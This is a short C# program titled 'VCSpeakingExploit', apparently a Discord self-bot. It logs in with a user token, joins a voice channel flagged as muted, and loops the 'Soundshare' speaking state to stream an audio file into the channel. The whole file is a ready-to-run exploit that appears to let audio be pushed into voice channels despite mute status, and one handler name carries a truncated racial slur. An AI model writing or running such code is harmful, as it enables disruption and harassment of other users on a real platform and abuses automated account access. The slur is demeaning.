using Discord.Gateway;
using Discord.Media;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace VCSpeakingExploit
{
    class Program
    {
        public static string Token = "Your token here";
        public static string AudioPath = "Audio path or url here";
        public static ulong GuildId = 727887082005069964;
        public static ulong ChannelId = 727887082491740301;

        static void Main()
        {
            DiscordSocketClient client = new DiscordSocketClient();
            client.OnLoggedIn += Nig_OnLoggedIn;
            client.OnJoinedVoiceChannel += Client_OnJoinedVoiceChannel;
            client.Login(Token);

            Thread.Sleep(-1);
        }

        private static void Client_OnJoinedVoiceChannel(DiscordSocketClient client, VoiceConnectEventArgs args)
        {
            Console.WriteLine("Connected");

            while (args.Client.State == MediaConnectionState.Ready)
            {
                args.Client.Microphone.SetSpeakingState(DiscordSpeakingFlags.Soundshare);
                args.Client.Microphone.CopyFrom(DiscordVoiceUtils.GetAudioStream(AudioPath));
            }
        }

        private static void Nig_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
        {
            Console.WriteLine("Logged in");

            client.GetVoiceClient(GuildId).Connect(ChannelId, new VoiceConnectionProperties() { Muted = true });
        }
    }
}
